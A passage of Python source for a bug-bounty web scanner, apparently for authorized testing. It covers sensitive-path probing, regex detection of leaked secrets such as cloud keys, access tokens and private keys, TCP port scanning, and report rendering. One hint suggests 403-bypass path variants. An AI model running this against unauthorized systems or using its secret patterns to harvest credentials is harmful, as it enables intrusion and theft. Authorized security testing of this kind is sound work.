        ("test.php",           "HIGH",     "test.php exposed"),
        ("elmah.axd",          "HIGH",     "ELMAH error log exposed (.NET)"),
        (".git/logs/HEAD",     "CRITICAL", "Git commit log exposed — full history readable"),
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        base = f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
        for path, sev, title in self.PATHS:
            url = f"{base}/{path}"
            r = get(url, allow_redirects=False, timeout=SHORT_TIMEOUT)
            if not r:
                continue
            code = r.status_code
            if code == 200:
                res.add("Paths", sev, f"{title}",
                        detail=f"URL: {url}  HTTP: {code}",
                        evidence=f"GET /{path} -> 200 OK",
                        remediation=f"Remove or restrict access to /{path} via web server config.",
                        cwe="CWE-200",
                        bounty_hint=f"{'CRITICAL: API keys/secrets may be leaked' if sev == 'CRITICAL' else 'Review for sensitive data.'}")
            elif code == 403 and sev in ("CRITICAL", "HIGH"):
                # Exists but access denied — still worth noting
                res.add("Paths", "LOW", f"Path exists but access denied: /{path}",
                        detail=f"HTTP 403 — file exists but is protected.",
                        bounty_hint="Try path bypass: /%2e/{path}, /{path}%20, ///{path}")


# ═══════════════════════════════════════════════════════════════════════════════
# 13. Information Disclosure in Body
# ═══════════════════════════════════════════════════════════════════════════════

class InfoDisclosureScanner:
    """API keys, internal IPs, stack traces, debug info, comments."""

    PATTERNS = [
        (r"AKIA[0-9A-Z]{16}",           "CRITICAL", "AWS Access Key ID exposed"),
        (r"(?i)api[_-]?key\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{20,}['\"]?", "HIGH", "API key pattern found"),
        (r"(?i)secret[_-]?key\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{20,}['\"]?", "HIGH", "Secret key pattern found"),
        (r"(?i)password\s*[:=]\s*['\"]?[^\s'\"]{6,}['\"]?", "HIGH", "Password value in response"),
        (r"(?i)private[_-]?key\s*[:=]\s*['\"]?[A-Za-z0-9+/=\-_]{20,}['\"]?", "HIGH", "Private key pattern found"),
        (r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+", "MEDIUM", "JWT token in response body"),
        (r"(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}", "LOW", "Internal IP address exposed"),
        (r"(?i)exception|stack\s*trace|at\s+[\w.]+\([\w.]+:\d+\)", "MEDIUM", "Stack trace / exception in response"),
        (r"(?i)debug\s*=\s*true|debug\s*mode\s*on|development\s*mode", "MEDIUM", "Debug mode enabled"),
        (r"(?i)sql\s+error|mysql_error|pg_query|sqlite_error", "HIGH", "SQL error in response"),
        (r"<!--.*?(?:password|secret|key|todo|hack|fixme|admin|debug).*?-->", "LOW", "Sensitive HTML comment"),
        (r"(?i)BEGIN\s+RSA\s+PRIVATE\s+KEY", "CRITICAL", "RSA private key exposed!"),
        (r"(?i)BEGIN\s+(?:EC|DSA|OPENSSH)\s+PRIVATE\s+KEY", "CRITICAL", "Private key file exposed!"),
        (r"ghp_[A-Za-z0-9]{36}", "CRITICAL", "GitHub Personal Access Token exposed"),
        (r"xox[baprs]-[A-Za-z0-9-]{10,}", "CRITICAL", "Slack token exposed"),
        (r"AIza[0-9A-Za-z\-_]{35}", "HIGH", "Google API key exposed"),
        (r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com", "HIGH", "Google OAuth client ID"),
    ]

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        targets = [parsed.geturl(), f"{parsed.scheme}://{parsed.netloc}/robots.txt",
                   f"{parsed.scheme}://{parsed.netloc}/sitemap.xml"]

        bodies_checked = set()
        for url in targets:
            r = get(url, timeout=SHORT_TIMEOUT)
            if not r:
                continue
            body = _body(r)
            if body in bodies_checked:
                continue
            bodies_checked.add(body)

            for pattern, sev, title in self.PATTERNS:
                matches = re.findall(pattern, body, re.DOTALL)
                if matches:
                    sample = str(matches[0])[:80]
                    res.add("Info Disclosure", sev, f"{title} in {url}",
                            detail=f"Pattern match: {sample}",
                            evidence=f"Regex {pattern[:40]} matched in response body",
                            remediation="Remove sensitive data from responses. Never expose credentials in HTML/JS/API responses.",
                            cwe="CWE-200",
                            bounty_hint=f"{'CRITICAL secret exposure — report immediately' if sev == 'CRITICAL' else 'Review and sanitize response.'}")


# ═══════════════════════════════════════════════════════════════════════════════
# 14. Port Scanner
# ═══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    PORTS = [
        (21, "FTP"), (22, "SSH"), (23, "Telnet"), (25, "SMTP"),
        (53, "DNS"), (80, "HTTP"), (110, "POP3"), (143, "IMAP"),
        (161, "SNMP"), (389, "LDAP"), (443, "HTTPS"), (445, "SMB"),
        (465, "SMTPS"), (587, "SMTP-Submission"), (993, "IMAPS"),
        (995, "POP3S"), (1080, "SOCKS"), (1433, "MSSQL"),
        (1521, "Oracle"), (2181, "ZooKeeper"), (2375, "Docker API (unauth!)"),
        (2376, "Docker TLS"), (3000, "Dev/Grafana"), (3306, "MySQL"),
        (3389, "RDP"), (4000, "Dev"), (4444, "Metasploit"),
        (5000, "Flask/Dev"), (5432, "PostgreSQL"), (5601, "Kibana"),
        (5672, "RabbitMQ"), (5900, "VNC"), (6379, "Redis"),
        (6443, "K8s API"), (7001, "WebLogic"), (8000, "HTTP-Alt"),
        (8080, "HTTP-Alt"), (8081, "HTTP-Alt"), (8443, "HTTPS-Alt"),
        (8888, "Jupyter"), (9000, "PHP-FPM/Portainer"), (9090, "Prometheus"),
        (9200, "Elasticsearch"), (9300, "Elasticsearch-Node"),
        (11211, "Memcached"), (15672, "RabbitMQ-Mgmt"), (27017, "MongoDB"),
        (27018, "MongoDB"), (50070, "Hadoop"), (50075, "Hadoop-DN"),
    ]
    CRITICAL_PORTS = {2375, 4444, 9200, 27017, 6379, 11211, 50070, 5900, 23}
    HIGH_PORTS     = {21, 23, 3306, 5432, 1433, 1521, 3389, 7001, 5672, 9000}

    def run(self, res: ScanResult, parsed: urllib.parse.ParseResult) -> None:
        host = parsed.hostname or ""
        for port, svc in self.PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((host, port)) == 0:
                    if port in self.CRITICAL_PORTS:
                        sev = "CRITICAL"
                    elif port in self.HIGH_PORTS:
                        sev = "HIGH"
                    else:
                        sev = "INFO"
                    rem = ""
                    if port == 2375:
                        rem = "Unauthenticated Docker API — full host compromise possible!"
                    elif port == 9200:
                        rem = "Elasticsearch may have no auth — all data exposed."
                    elif port in (27017, 27018):
                        rem = "MongoDB may have no auth — check if data is exposed."
                    elif port == 6379:
                        rem = "Redis with no auth — full read/write access to cache/data."
                    elif port == 5900:
                        rem = "VNC exposed — may allow remote desktop without auth."
                    res.add("Ports", sev, f"Port {port}/{svc} open",
                            evidence=f"TCP connect to {host}:{port} succeeded",
                            remediation=rem or f"Firewall port {port} if not needed publicly.",
                            bounty_hint=f"{'CRITICAL infrastructure exposure' if sev == 'CRITICAL' else ''}")
                s.close()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# Main Orchestrator
# ═══════════════════════════════════════════════════════════════════════════════

QUICK_MODULES = {
    "DNS Recon", "Subdomain Enum", "TLS/SSL Deep Audit",
    "Security Headers", "Sensitive Paths", "Injection Suite",
    "XSS Advanced", "Port Scan", "Info Disclosure",
}


def _module_summary(res: ScanResult) -> str:
    """Build a summary string of critical/high findings for the last-seen module."""
    if not res.findings:
        return "[dim]ok[/dim]"
    last_mod = res.findings[-1].module
    crit = sum(1 for f in res.findings if f.severity == "CRITICAL" and f.module == last_mod)
    high = sum(1 for f in res.findings if f.severity == "HIGH" and f.module == last_mod)
    parts = []
    if crit:
        parts.append(f"[bold red]{crit} CRIT[/bold red]")
    if high:
        parts.append(f"[red]{high} HIGH[/red]")
    if not parts:
        return "[dim]ok[/dim]"
    return " ".join(parts)


class CyberScanner:
    """Advanced bug bounty + ethical hacking scanner orchestrator.

    Features:
      - Parallel module execution via thread pool (up to 4 workers)
      - Shared response cache to eliminate duplicate HTTP calls
      - Built-in rate limiting (150ms min gap between requests)
      - ``quick=True`` — runs only the highest-value modules
      - ``modules=[...]`` — run specific modules by name (partial match OK)
      - ``--json <path>`` — write a machine-readable JSON report
    """

    MODULES = [
        ("DNS Recon",              DNSReconScanner()),
        ("Subdomain Enum",         SubdomainScanner()),
        ("Cloud Assets",           CloudScanner()),
        ("TLS/SSL Deep Audit",     TLSScanner()),
        ("Security Headers",       HeadersScanner()),
        ("JWT Analysis",           JWTScanner()),
        ("Injection Suite",        InjectionScanner()),
        ("XSS Advanced",           XSSScanner()),
        ("Host Header / Cache",    HostHeaderScanner()),
        ("GraphQL Security",       GraphQLScanner()),
        ("Auth & Rate Limiting",   AuthScanner()),
        ("Sensitive Paths",        PathScanner()),
        ("Info Disclosure",        InfoDisclosureScanner()),
        ("Port Scan",              PortScanner()),
    ]

    def __init__(self, console: Any = None):
        self.console = console

    def _print(self, *args, **kwargs) -> None:
        if self.console and RICH_OK:
            self.console.print(*args, **kwargs)
        else:
            import builtins
            builtins.print(*args)

    # ── Module filtering ──────────────────────────────────────────────────────

    @staticmethod
    def _filter_modules(
        quick: bool = False,
        modules: Optional[List[str]] = None,
    ) -> List[tuple]:
        active = list(CyberScanner.MODULES)
        if quick:
            active = [(l, s) for l, s in active if l in QUICK_MODULES]
        if modules:
            lower_names = [m.lower() for m in modules]
            active = [
                (l, s) for l, s in active
                if l.lower() in lower_names
                or any(l.lower().startswith(n) for n in lower_names)
            ]
        return active

    # ── Main scan ─────────────────────────────────────────────────────────────

    def scan(
        self,
        url: str,
        *,
        quick: bool = False,
        modules: Optional[List[str]] = None,
    ) -> ScanResult:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urllib.parse.urlparse(url)

        if RICH_OK and self.console:
            self.console.print()
            self.console.print(Panel(
                "[bold red]!! AUTHORIZED USE ONLY !![/bold red]\n"
                "[dim]Only scan targets you own or have explicit written permission to test.\n"
                "Unauthorized scanning is illegal under CFAA, Computer Misuse Act, and similar laws.[/dim]",
                border_style="red", box=box.HEAVY, padding=(0, 2)
            ))
            self.console.print(Rule(
                f"[bold cyan]CyberArmy Advanced Bug Bounty Scanner[/bold cyan]"
                f"  [dim]->  {parsed.netloc}[/dim]",
                style="cyan"
            ))
            self.console.print()

        # Fresh cache per scan
        clear_cache()

        active = self._filter_modules(quick, modules)
        if not active:
            self._print("[red]No modules matched. Use --quick or --modules <name>[/red]")
            return ScanResult(target=url, finished_at=time.time())

        result = ScanResult(target=url)
        total = len(active)

        self._print(
            f"[dim]Running {total} module{'s' if total != 1 else ''}"
            f" {'| quick mode' if quick else ''}"
            f" {'| parallel' if total > 1 else ''}"
            f"...[/dim]"
        )

        if total == 1:
            # Single module — run inline (no threading overhead)
            label, scanner = active[0]
            self._print(f"[dim][01/01][/dim] [cyan]{label}[/cyan] ...", end=" ")
            try:
                scanner.run(result, parsed)
            except Exception as e:
                self._print(f"[red]error: {e}[/red]")
            else:
                self._print(_module_summary(result))
        else:
            # Parallel — ThreadPoolExecutor with 4 workers
            from threading import Lock
            done = 0
            done_lock = Lock()

            def _run_one(label, scanner):
                nonlocal done
                try:
                    scanner.run(result, parsed)
                except Exception:
                    pass
                with done_lock:
                    done += 1
                    n = done
                self._print(
                    f"[dim][{n:02d}/{total}][/dim] [cyan]{label}[/cyan]"
                    f" {_module_summary(result)}"
                )

            workers = _PARALLEL_WORKERS
            try:
                workers = int(os.environ.get("CYBERTEST_WORKERS", str(workers)))
            except Exception:
                pass
            with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, total)) as pool:
                futs = [pool.submit(_run_one, label, scanner) for label, scanner in active]
                for f in concurrent.futures.as_completed(futs):
                    f.result()  # surface exceptions

        result.finished_at = time.time()

        # Summary line
        counts = result.counts()
        crit_n = counts.get("CRITICAL", 0)
        high_n = counts.get("HIGH", 0)
        if crit_n:
            self._print(f"\n[bold red]{crit_n} CRITICAL, {high_n} HIGH[/bold red]"
                        f" [dim]| {result.elapsed:.1f}s | {sum(counts.values())} findings[/dim]")
        elif high_n:
            self._print(f"\n[red]{high_n} HIGH[/red]"
                        f" [dim]| {result.elapsed:.1f}s | {sum(counts.values())} findings[/dim]")
        else:
            self._print(f"\n[green]No critical/high findings[/green]"
                        f" [dim]| {result.elapsed:.1f}s | {sum(counts.values())} findings[/dim]")

        return result

    # ── Render ────────────────────────────────────────────────────────────────

    def render(
        self,
        result: ScanResult,
        *,
        json_path: Optional[str] = None,
    ) -> None:
        """Render the scan result.  If *json_path* is given, also write JSON."""
        if json_path:
            try:
                with open(json_path, "w", encoding="utf-8") as f:
                    f.write(result.to_json())
                self._print(f"[dim]JSON report written to {json_path}[/dim]")
            except Exception as e:
                self._print(f"[red]Could not write JSON report: {e}[/red]")

        if not (RICH_OK and self.console):
            self._render_plain(result)
            return

        self.console.print()
        self.console.print(Rule("[bold cyan]Bug Bounty Scan Report[/bold cyan]", style="cyan"))

        # Group by module
        modules: Dict[str, List[Finding]] = {}
        for f in result.by_severity():
            modules.setdefault(f.module, []).append(f)

        for mod, findings in modules.items():
            crit = sum(1 for f in findings if f.severity == "CRITICAL")
            high = sum(1 for f in findings if f.severity == "HIGH")
            badge = ""
            if crit:
                badge = f" [bold red]({crit} CRITICAL)[/bold red]"
            elif high:
                badge = f" [red]({high} HIGH)[/red]"

            self.console.print(f"\n[bold cyan]>> {mod}[/bold cyan]{badge}")
            for f in findings:
                if f.severity in ("OK", "INFO"):
                    self.console.print(f"   [dim]{f.severity:<8}[/dim]  {f.title}")
                    continue
                color = SEV_COLOR.get(f.severity, "white")
                self.console.print(f"   [bold {color}]{f.severity:<8}[/bold {color}]  {f.title}")
                if f.cwe:
                    self.console.print(f"             [dim]CWE: {f.cwe}[/dim]")
                if f.detail:
                    self.console.print(f"             [dim]{f.detail[:120]}[/dim]")
                if f.evidence:
                    self.console.print(f"             [dim italic]Evidence: {f.evidence[:100]}[/dim italic]")
                if f.remediation and f.severity not in ("OK", "INFO"):
                    self.console.print(f"             [green]Fix: {f.remediation[:120]}[/green]")
                if f.bounty_hint:
                    self.console.print(f"             [yellow]Bounty: {f.bounty_hint[:100]}[/yellow]")

        # Summary table
        self.console.print()
        self.console.print(Rule("[bold]Summary[/bold]", style="cyan"))
        counts = result.counts()
        table = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan", padding=(0, 1))
        table.add_column("Severity")
        table.add_column("Count", justify="right")
        table.add_column("Bar")

        for sev, _ in sorted(SEV.items(), key=lambda x: x[1]):
            n = counts.get(sev, 0)
            if n == 0:
                continue
            color = SEV_COLOR.get(sev, "white")
            bar = "=" * min(n * 2, 50)
            table.add_row(
                f"[bold {color}]{sev}[/bold {color}]",
                f"[{color}]{n}[/{color}]",
                f"[{color}]{bar}[/{color}]",
            )
        self.console.print(table)

        # Risk score
        score = result.risk_score()
        grade_label = next((g for t, g in CVSS_GRADE if score >= t), CVSS_GRADE[-1][1])
        score_color = "red" if score >= 7 else "yellow" if score >= 4 else "green"
        self.console.print(f"\n  [bold]Risk Score:[/bold] [{score_color}]{score:.1f}/10[/{score_color}]  [dim]{grade_label}[/dim]")

        counts_val = result.counts()
        crit_n = counts_val.get("CRITICAL", 0)
        high_n = counts_val.get("HIGH", 0)
        total_n = sum(counts_val.values())

        if crit_n:
            self.console.print(f"  [bold red]!! {crit_n} CRITICAL findings require immediate attention !![/bold red]")
        elif high_n:
            self.console.print(f"  [red]>> {high_n} HIGH severity findings to fix before next release[/red]")
        else:
            self.console.print(f"  [green]No critical/high issues detected[/green]")

        self.console.print(f"  [dim]Target: {result.target} | {total_n} findings | {result.elapsed:.1f}s[/dim]\n")

    def _render_plain(self, result: ScanResult) -> None:
        print(f"\n{'='*70}")
        print(f"BUG BOUNTY SCAN REPORT: {result.target}")
        print(f"{'='*70}")
        for f in result.by_severity():
            if f.severity in ("OK", "INFO"):
                continue
            print(f"\n[{f.severity}] {f.module}: {f.title}")
            if f.cwe:
                print(f"  CWE:    {f.cwe}")
            if f.detail:
                print(f"  Detail: {f.detail}")
            if f.remediation:
                print(f"  Fix:    {f.remediation}")
            if f.bounty_hint:
                print(f"  Bounty: {f.bounty_hint}")
        print(f"\nRisk Score: {result.risk_score():.1f}/10")
        print(f"Elapsed: {result.elapsed:.1f}s | Findings: {len(result.findings)}")
